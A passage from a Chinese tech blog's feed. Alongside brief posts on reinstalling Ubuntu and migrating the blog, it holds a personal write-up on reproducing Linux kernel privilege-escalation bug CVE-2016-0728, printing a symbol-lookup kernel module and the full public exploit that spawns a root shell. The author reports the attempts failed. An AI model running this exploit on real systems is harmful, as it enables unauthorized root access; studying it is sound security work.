systemd-logind</span><br></pre></td></tr></table></figure><p>再装些有的没的常用软件，差不多基本配置就OK了，后面各个环境全部docker化吧，Ubuntu环境乱了很难受。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;之前在一号本（OneMix3 Pro）上装的Ubuntu系统因为懒得做环境分离，终于把环境搞乱了 T_T，遂重装一下Ubuntu顺便升到最新版20.04。&lt;/p&gt;
&lt;p&gt;一号本有点ZZ，主板层面认为屏幕是竖着的，所以除原生 win10 ，加了grub之后，grub和ubuntu默认都是竖屏的。而之前装系统的时候没有做过程记录，所以忘了上次是怎么解决“竖屏”问题的了。。。&lt;/p&gt;
&lt;p&gt;重新google一番，主要发现以下方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="ubuntu" scheme="https://badb100d.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>博客迁移小记</title>
    <link href="https://badb100d.com/2017/08/29/2017-08-29/"/>
    <id>https://badb100d.com/2017/08/29/2017-08-29/</id>
    <published>2017-08-29T15:01:00.000Z</published>
    <updated>2017-08-29T15:01:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　翻看历史邮件想起来前段时间farbox向bitcron进化了，于是抽时间把博客从旧平台迁移过来，还加了个https。由于之前用的“多说”评论系统失效，尝试了下disqus，不科学上网连评论框都看不到。。。　　换用“来必乐”试了试，样式倒是不错，可惜加载太慢，也不支持旧评论导入，索性就改回bitcron原生评论系统吧。原生评论系统功能比较单一，好在格式比较简单，手动把以前多说的json改成csv同步了一下，基本恢复迁移前的样子。</p><p>　　说起来也有一年多没写点东西了，bitcron，还是要cron的，过几天记录一下能回想起来的事情吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　翻看历史邮件想起来前段时间farbox向bitcron进化了，于是抽时间把博客从旧平台迁移过来，还加了个https。由于之前用的“多说”评论系统失效，尝试了下disqus，不科学上网连评论框都看不到。。。　　换用“来必乐”试了试，样式倒是不错，可惜加载太慢，也不支持旧评论导入，索性就改回bitcron原生评论系统吧。原生评论系统功能比较单一，好在格式比较简单，手动把以前多说的json改成csv同步了一下，基本恢复迁移前的样子。&lt;/p&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://badb100d.com/categories/life/"/>
    
    
      <category term="life" scheme="https://badb100d.com/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>看看CVE-2016-0728</title>
    <link href="https://badb100d.com/2016/01/27/2016-01-27/"/>
    <id>https://badb100d.com/2016/01/27/2016-01-27/</id>
    <published>2016-01-27T13:11:00.000Z</published>
    <updated>2016-01-27T13:11:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>上周末看了下<strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">cve-2016-0728<i class="fa fa-external-link"></i></span></strong> linux本地提权漏洞，今天记录一下。<br>这个漏洞主要是因为keyrings内核组件的引用泄露引起的。<br>此内核对象采用一个32位无符号整数做引用计数，但在引用计数溢出的时候没有进行合理的错误处理，所以当对此对象引用到达4G时会使引用计数回到0，内核在检测到此引用计数为0时会析构对象释放空间。而此时r3程序还保留有内核对象的引用，如此就形成了一个UAF漏洞。<br>印象中这种整形溢出造成的严重漏洞还真不少，本着实践出真知的态度实践一下。<br><strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">原文<i class="fa fa-external-link"></i></span></strong>中提到：<br>“Addresses of commit_creds and prepare_kernel_cred functions are static and can be determined per Linux kernel version/android device.”<br>所以先写了个内核模块获取这俩函数的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">find_symbol_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">find_symbol_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="comment">//模块加载函数：</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">find_symbol_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * name1= <span class="string">&quot;prepare_kernel_cred&quot;</span>;<span class="comment">//待查找的内核符号的名字</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * name2= <span class="string">&quot;commit_creds&quot;</span>;<span class="comment">//待查找的内核符号的名字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> * <span class="title">ksymbol</span> ;</span>  <span class="comment">// 用于接收测试函数返回值</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> * <span class="title">owner</span>;</span>            <span class="comment">// 内核符号所属的模块</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *crc;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name[<span class="number">2</span>]=&#123;name1,name2&#125;;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)&#123;</span><br><span class="line"><span class="keyword">bool</span> gplok = <span class="literal">true</span>;                <span class="comment">// 模块支持GPL 许可</span></span><br><span class="line"><span class="keyword">bool</span> warn = <span class="literal">true</span>;                 <span class="comment">// 允许输出警告信息</span></span><br><span class="line">ksymbol = find_symbol(*(name+i),&amp;owner,&amp;crc,gplok,warn);     <span class="comment">//调用待测试函数</span></span><br><span class="line"><span class="keyword">if</span>( ksymbol != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*输出查找到的内核符号在内存中的地址*/</span></span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;ksymbol-&gt;value : %lx\n&quot;</span>,ksymbol-&gt;value);</span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;ksymbol-&gt;name : %s\n&quot;</span>,ksymbol-&gt;name);   <span class="comment">//输出内核符号名字</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;Failed to find symbol %s\n&quot;</span>, *(name+i));</span><br><span class="line"><span class="keyword">if</span>( owner != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*输出内核符号所属的模块的名字*/</span></span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt; owner-&gt;name : %s\n&quot;</span>,owner-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( crc != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*  输出内核符号的crc 值所在的地址*/</span></span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;*crc : %lx\n&quot;</span>,*crc);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//模块退出函数：</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">find_symbol_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">printk(<span class="string">&quot;&lt;0&gt;module exit ok!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//模块加载、退出函数调用：</span></span><br><span class="line">module_init(find_symbol_init);</span><br><span class="line">module_exit(find_symbol_exit);</span><br></pre></td></tr></table></figure><p>Google了一番将其编译成ko文件，再</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 加载</span></span><br><span class="line">insmod find_symbol.ko</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 卸载</span></span><br><span class="line">rmmod find_symbol</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看输出</span></span><br><span class="line">dmesg</span><br></pre></td></tr></table></figure><p>得到如下内容：</p><p>根据获取到的两个函数地址修改<strong><span class="exturl" data-url="aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=" title="http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/">原文<i class="fa fa-external-link"></i></span></strong>中的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f */</span></span><br><span class="line"><span class="comment">/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */</span></span><br><span class="line"><span class="comment">/* $ ./cve_2016_072 PP_KEY */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff810957e0)<span class="comment">//got from find_symbol//(0xffffffff81094250)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81095ae0)<span class="comment">//got from find_symbol//(0xffffffff81094550)</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line">    <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">    &#125; msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> msqid;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line">    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line">    <span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*此处为个人添加，可动态显示内核对象的引用进度*/</span></span><br><span class="line"><span class="keyword">if</span> (i&lt;<span class="number">0xffffff00</span> &amp;&amp; i % <span class="number">429496</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">double</span> tmp=i*<span class="number">1.0</span>/<span class="number">42949670</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\r\x1b[KProgress: %3.1lf%%\r&quot;</span>,tmp);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************************/</span></span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译，运行</p><p>此时查看/proc/keys的内容可以看到keyring的引用计数在变化(ubuntu14下是无规则变动O_O，其他系统正常)</p><p>经过漫长的等待，得到如下结果：</p><p>并没有得到root。。。</p><p>分别在ubuntu14、centos6.5、centos7.0、kali等平台的虚拟机里尝试，都没有成功提权。。。猜测是因为虚拟机内存的释放和分配受其他因素影响比较厉害，一直无法使目标函数指针分配到正确的位置。一怒之下把函数地址分别改成0x0和0x1，出现 Ubuntu发生严重错误需要重启 的对话框，看起来是有被调用的样子。。<br>另，根据google的一份对应arm上安卓的代码(用syscall代替了一些api)编译了安卓上的poc，尝试在CM12下的一加手机上运行：</p><img src="/2016/01/27/2016-01-27/1.pic.jpg" class=""><p>算了下，按这速度估计得跑个个把月。<br>(另，第二天解锁手机发现进度在0.018%，估计有生之年跑不完了 T_T )。</p><p>由于实践失败并没有出真知，因此度过了一个不愉快的周末。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上周末看了下&lt;strong&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=&quot; title=&quot;http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/&quot;&gt;cve-2016-0728&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/strong&gt; linux本地提权漏洞，今天记录一下。&lt;br&gt;这个漏洞主要是因为keyrings内核组件的引用泄露引起的。&lt;br&gt;此内核对象采用一个32位无符号整数做引用计数，但在引用计数溢出的时候没有进行合理的错误处理，所以当对此对象引用到达4G时会使引用计数回到0，内核在检测到此引用计数为0时会析构对象释放空间。而此时r3程序还保留有内核对象的引用，如此就形成了一个UAF漏洞。&lt;br&gt;印象中这种整形溢出造成的严重漏洞还真不少，本着实践出真知的态度实践一下。&lt;br&gt;&lt;strong&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=&quot; title=&quot;http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/&quot;&gt;原文&lt;i class=&quot;fa 